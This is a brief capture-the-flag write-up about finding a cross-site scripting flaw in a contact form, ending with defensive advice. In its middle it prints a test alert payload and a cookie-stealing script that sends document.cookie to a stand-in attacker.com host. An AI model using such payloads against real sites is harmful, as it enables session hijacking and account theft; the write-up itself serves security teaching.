Title: Cross-Site Scripting (XSS) Attack on Contact Form

During a CTF competition, I encountered a web application that allowed users to send messages to the site administrator through a contact form. Given the potential security risks associated with user input, I suspected that the application might be vulnerable to Cross-Site Scripting (XSS), a type of vulnerability that allows attackers to inject malicious scripts into a web page viewed by other users.

To test for XSS, I crafted a malicious payload containing a JavaScript script, such as <script>alert("XSS Attack!")</script>, and submitted it to the application's contact form. If the application allowed the payload to execute and display the JavaScript script to other users, it would confirm the presence of an XSS vulnerability.

Upon submitting the crafted payload to the application, it indeed executed and displayed the JavaScript script to other users, confirming the vulnerability. To obtain the flag for the Web Exploitation challenge, I needed to use the XSS vulnerability to steal the session cookie of a logged-in user.

After researching the application's session management and cookie handling, I crafted a suitable payload containing a JavaScript script that would extract the session cookie from a logged-in user, such as <script>document.location='https://attacker.com/steal.php?cookie='+document.cookie</script>. The server successfully recognized the payload and responded with the session cookie for the logged-in user.

This CTF writeup highlights the importance of properly securing web applications against XSS vulnerabilities by implementing proper input validation and output encoding controls, using secure cookie handling, and validating user input. By exploiting the vulnerability, I was able to steal sensitive information, execute malicious code, and complete the Web Exploitation challenge.
